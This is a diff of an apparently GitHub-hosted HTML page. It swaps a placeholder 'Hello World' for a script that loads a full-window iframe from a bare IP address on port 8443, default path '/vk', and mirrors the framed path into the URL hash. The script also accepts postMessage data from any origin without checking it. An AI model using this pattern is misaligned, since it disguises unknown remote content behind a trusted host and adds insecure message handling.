@@ -1,7 +1,55 @@
 <!DOCTYPE html>
 <html>
-<body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
+<body style="margin: 0">
+<script type="text/javascript">
+	function onIframeChange(event) {
+		var frame = event.target;
+		if (frame) {
+			var parser = document.createElement('a');
+			parser.href = frame.src;
+			var framePathname = parser.pathname;
+			if (currentUrl != framePathname) {
+				window.location.hash = framePathname + parser.search;
+			}
+		}
+	}
+	function generateDomainSrc(url) {
+		url = url || '/vk';
+		return 'https://77.244.214.230:8443' + url; 
+	}
+	function generateFrame(url){
+		var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", generateDomainSrc(url));
+        ifrm.setAttribute("id", "mainFrame");
+        ifrm.style.width = "100%";
+        ifrm.style.height = "1000px";
+        ifrm.frameborder="0";
+        ifrm.addEventListener('load', onIframeChange);
+        return ifrm;
+	}
+	var currentUrl ;
+
+	var hashLocation = window.location.hash;
+	if(hashLocation && hashLocation.length > 1){
+		currentUrl = hashLocation.substring(1);
+	}
+	var isFrameGenerated = false;
+	if (!isFrameGenerated) {
+		isFrameGenerated = true;
+		var frame = generateFrame(currentUrl)
+		document.body.appendChild(frame);
+	}
+
+	var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
+	var eventer = window[eventMethod];
+	var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
+	eventer(messageEvent,function(e) {
+    	var key = e.message ? "message" : "data";
+    	var data = e[key];
+    	console.log('listener', key, data, e.origin);
+		window.location.hash = data;
+	},false);
+
+</script>
 </body>
 </html>
